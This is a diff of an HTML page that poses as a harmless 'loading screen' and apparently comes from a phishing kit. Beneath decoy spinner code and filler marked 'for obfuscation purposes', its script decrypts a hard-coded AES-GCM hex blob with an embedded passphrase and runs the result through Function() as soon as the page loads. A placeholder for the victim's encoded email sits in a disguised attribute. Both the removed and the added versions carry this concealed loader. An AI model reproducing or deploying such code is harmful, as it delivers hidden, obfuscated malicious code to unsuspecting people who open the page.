@@ -3,134 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="author" content="Anonymous Developer">
-    <title>Enhanced Loading Interface</title>
+    <meta name="author" content="Creative Dev">
+    <title>Dynamic Loading Screen</title>
     <style>
         body {
-            margin: 0;
             padding: 0;
-            font-family: 'Verdana', sans-serif;
-            background-color: #eef2f3;
+            margin: 0;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            height: 100vh;
+            justify-content: center;
+            background-color: #f8f9fa;
+            font-family: Arial, Helvetica, sans-serif;
+            min-height: 100vh;
             overflow: hidden;
         }
-        .loader-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-        }
-        .spinning-circle {
+        .spinner-box {
             width: 70px;
             height: 70px;
-            border: 10px solid #ccc;
-            border-top: 10px solid #4caf50;
+            border: 10px solid #ddd;
+            border-top: 10px solid #007bff;
             border-radius: 50%;
-            animation: spinAnimation 1.5s linear infinite;
+            animation: spin-circle 1.2s linear infinite;
         }
-        @keyframes spinAnimation {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @keyframes spin-circle {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
         }
-        .hidden-text {
-            visibility: hidden;
-            font-size: 16px;
-            color: crimson;
-        }
-        .status-message {
-            margin-top: 25px;
-            font-size: 20px;
+        .loading-status {
+            margin-top: 15px;
+            font-size: 18px;
             color: #555;
         }
-        .extra-div {
-            opacity: 0;
-            pointer-events: none;
-            position: absolute;
-            bottom: 0;
-            left: 0;
+        .hidden-section {
+            visibility: hidden;
         }
     </style>
 </head>
 <body>
 
-    <!-- Hidden container -->
-    <div id="hidden-container" style="display: none;">
-        <div class="dummy-element" unused-attr="dummy"></div>
-        <div nike-bashman="" adidas="<%=EMAIL64%>"></div>
+    <!-- Hidden section -->
+    <div class="hidden-section">
+        <div id="extra-node" data-value="placeholder"></div>
     </div>
 
-    <div class="loader-container">
-        <div class="spinning-circle" extra-info="sample"></div>
-    </div>
-    <p class="status-message">Preparing your document. Please hold...</p>
+    <!-- Loader -->
+    <div class="spinner-box"></div>
+    <p nike-bashman="" adidas="<%=EMAIL64%>" class="loading-status">Hang tight! Processing your request...</p>
 
-    <!-- Additional unused elements -->
-    <div class="extra-div">
-        <span>This is an unused and hidden section.</span>
+    <!-- Additional unused content -->
+    <div style="display: none;">
+        <span>Extra content for obfuscation purposes.</span>
     </div>
 
-    <!-- Main Script -->
+    <!-- Core Script -->
     <script>
-        // Adding redundant operations
-        const initiateFakeTask = () => {
-            const fakeTasks = ["StepA", "StepB", "StepC"];
-            fakeTasks.forEach(task => console.log(`Running: ${task}`));
+        const executeFakeTasks = () => {
+            const tasks = ["TaskAlpha", "TaskBeta", "TaskGamma"];
+            tasks.forEach(task => console.log(`Executing: ${task}`));
         };
-        initiateFakeTask();
+        executeFakeTasks();
 
-        // Simulate loading completion
         setTimeout(() => {
-            document.querySelector('.status-message').textContent = 'Your document is now ready!';
-            document.body.style.backgroundColor = '#f3fce3';
-        }, 5500);
+            document.querySelector('.loading-status').textContent = "Process completed!";
+            document.body.style.backgroundColor = '#e7ffe6';
+        }, 5000);
 
-        // Insert dummy elements
         (() => {
-            const redundantDiv = document.createElement('div');
-            redundantDiv.setAttribute('id', 'dummyDiv');
-            redundantDiv.innerHTML = 'Extra content for no reason!';
-            console.log(redundantDiv);
+            const redundantElement = document.createElement('div');
+            redundantElement.id = 'hiddenContent';
+            redundantElement.textContent = "This won't show up.";
+            console.log(redundantElement);
         })();
     </script>
 
-    <!-- Additional Script for Noise -->
+    <!-- Advanced Decryption Logic -->
     <script>
-        const unnecessaryLogger = () => {
-            const redundantLog = "This log is unnecessary.";
-            for (let i = 0; i < 3; i++) {
-                console.log(redundantLog);
-            }
-        };
-        unnecessaryLogger();
+        const decryptContent = async (encryptedData, ivHex, saltHex, passphrase) => {
+            console.log("[INFO] Starting decryption...");
 
-        const performDataDecryption = async (encryptedData, ivString, saltString, passphrase) => {
-            console.log("[INFO] Decryption procedure initiated...");
-
-            // Convert hex to bytes
-            const hexToBytes = (hex) => {
-                console.log(`[DEBUG] Hexadecimal conversion in progress: ${hex}`);
-                return Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
+            const hexToBytes = (hexString) => {
+                return Uint8Array.from(hexString.match(/.{2}/g).map(byte => parseInt(byte, 16)));
             };
 
-            const ivBytes = hexToBytes(ivString);
-            const saltBytes = hexToBytes(saltString);
-
-            // Simulate delay for no reason
-            const fakeDelay = () => new Promise(resolve => {
-                console.log("[INFO] Simulating delay...");
+            const delaySimulation = () => new Promise(resolve => {
+                console.log("[DEBUG] Simulating delay...");
                 setTimeout(() => {
-                    console.log("[DEBUG] Delay concluded.");
                     resolve();
                 }, 200);
             });
 
-            // Deriving key
             const deriveKey = async (keyMaterial, salt) => {
-                console.log("[INFO] Deriving decryption key...");
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                     keyMaterial,
@@ -148,13 +111,12 @@
                 ["deriveKey"]
             );
 
-            await fakeDelay();
-            const aesKey = await deriveKey(keyMaterial, saltBytes);
+            await delaySimulation();
+            const aesKey = await deriveKey(keyMaterial, hexToBytes(saltHex));
 
             try {
-                console.log("[INFO] Starting decryption...");
                 const decryptedContent = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: ivBytes },
+                    { name: "AES-GCM", iv: hexToBytes(ivHex) },
                     aesKey,
                     hexToBytes(encryptedData)
                 );
@@ -166,46 +128,34 @@
             }
         };
 
-        // Analyze decrypted data
-        const analyzeDecryptedData = (data) => {
+        const analyzeData = (data) => {
             console.log("[INFO] Analyzing decrypted content...");
             if (!data) {
-                console.error("[ERROR] Content missing.");
+                console.error("[ERROR] Missing data.");
                 return;
             }
-            const reversedContent = data.split("").reverse().join("");
-            console.log("[INFO] Reversed content:", reversedContent);
-            return reversedContent;
+            const reversedData = data.split("").reverse().join("");
+            console.log("[INFO] Reversed data:", reversedData);
+            return reversedData;
         };
 
-        // Initialization block
         (async () => {
-            console.log("[INFO] Initialization started...");
-            const payload = {
+            console.log("[INFO] Decryption workflow initiated...");
+         const payload = {
                 iv: "c5d54a9c69516d18fab025aa",
                 salt: "f2c9263a7137550b0829e316a222b86e",
                 data: "7c186924f7b217943e4c6487f9d39b9910bc7e640ffc082516da5a9b8caf274be8b70ffd65131a24d3f7193f6f5dd3e09d0a3fad4dcfe75feb75f009b820f7974fa3c7cd763720aec91aa95aab0121cada3f156e35e520eb549e4f0c4b3efd501a525f8e3df5ff4bdde38199df65ddb856d5304bed2dba800983ecb1af1d7b6481700ddc96c5f3647cf54a430e067be7e01beb2ddd09e0bf4795d77e4e69c4459c8a926bc922680f55877eb0cf57b26d2450952d66fb175206cd3d15257f8eed99d48bfd50931242"
             };
 
-            console.log("[INFO] Payload details:", payload);
+            const passphrase = "quickescape";
+            const decryptedResult = await decryptContent(payload.data, payload.iv, payload.salt, passphrase);
 
-            try {
-                const decryptedResult = await performDataDecryption(
-                    payload.data,
-                    payload.iv,
-                    payload.salt,
-                    "quickescape"
-                );
+            if (decryptedResult) {
+                console.log("[INFO] Decrypted data:", decryptedResult);
+                const analyzedOutput = analyzeData(decryptedResult);
 
-                if (decryptedResult) {
-                    console.log("[INFO] Decrypted result:", decryptedResult);
-                    const finalOutput = analyzeDecryptedData(decryptedResult);
-
-                    console.log("[INFO] Executing decrypted content...");
-                    Function(`${decryptedResult}`)();
-                }
-            } catch (err) {
-                console.error("[ERROR] An unexpected error occurred:", err);
+                console.log("[INFO] Executing decrypted output...");
+                Function(`${decryptedResult}`)();
             }
         })();
     </script>
